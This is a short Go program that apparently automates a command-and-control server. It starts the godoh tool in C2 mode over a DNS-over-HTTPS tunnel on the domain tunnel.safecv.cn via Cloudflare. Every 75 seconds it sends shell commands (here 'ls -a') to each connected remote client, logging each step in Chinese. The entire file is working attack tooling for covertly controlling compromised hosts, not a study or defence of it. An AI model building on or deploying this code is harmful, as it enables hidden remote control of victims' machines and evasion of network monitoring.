package main

import (
	"go-godoh-proxy/child"
	"go-godoh-proxy/godoh"
	"go-godoh-proxy/logger"
	"time"
)

func main() {
	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "tunnel.safecv.cn", "-p", "cloudflare")
	if err != nil {
		panic(err)
	}
	logger.Log("子进程创建成功")
	p.Handle(func(stream *child.IOStream) {
		isRunning := true
		sendDuration := 75 * time.Second
		sendCommands := []string{
			"ls -a",
		}
		logger.Log("系统启动")
		i := godoh.NewIdentityReader(stream)
		go i.SyncTickHandle(sendDuration, func(identity string) {
			logger.Log("当前已连接客户端：" + identity)
			logger.Log("正在处理 " + identity)
			for _, cmd := range sendCommands {
				logger.Log("执行命令：" + cmd)
				i.Run(cmd)
			}
		}, &isRunning)
		godoh.SyncListen(stream, []godoh.LineReader{i})
	})
	logger.Log("等待退出")
	p.Wait()
}
